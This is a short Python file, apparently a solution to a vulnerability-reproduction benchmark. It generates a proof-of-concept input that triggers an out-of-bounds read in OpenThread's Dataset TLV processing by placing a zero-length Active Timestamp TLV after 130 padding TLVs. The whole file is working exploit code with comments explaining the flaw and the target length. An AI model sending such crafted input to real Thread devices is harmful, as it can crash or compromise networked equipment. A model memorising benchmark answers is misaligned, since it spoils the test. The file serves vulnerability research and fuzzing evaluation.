class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Stack Buffer Overflow (specifically an OOB Read triggering ASAN)
        # in OpenThread's Dataset processing. Active Timestamp (Type 14) and others are not
        # validated for minimum required length (8 bytes) in IsTlvValid.
        # When a Dataset contains a short Active Timestamp TLV (e.g. length 0), IsTlvValid passes,
        # but subsequent code reads 8 bytes from the buffer, leading to an overflow if the TLV
        # is positioned at the end of the buffer.
        
        # Ground truth PoC length is 262 bytes.
        # We assume the target buffer or processing window corresponds to this size.
        # We fill the buffer with neutral padding TLVs and place the malicious TLV at the very end.
        
        poc = bytearray()
        
        # Padding: 130 TLVs of Type 0x7F (Unknown/Reserved), Length 0
        # Type 0x7F is likely skipped by the parser.
        # 130 * 2 bytes = 260 bytes
        for _ in range(130):
            poc.extend(b'\x7f\x00')
            
        # Malicious TLV: Active Timestamp (Type 0x0E), Length 0x00
        # Expected length is 8. Vulnerable code accepts 0.
        # Reading the value (8 bytes) from this position (offset 262) will read out of bounds.
        poc.extend(b'\x0e\x00')
        
        return bytes(poc)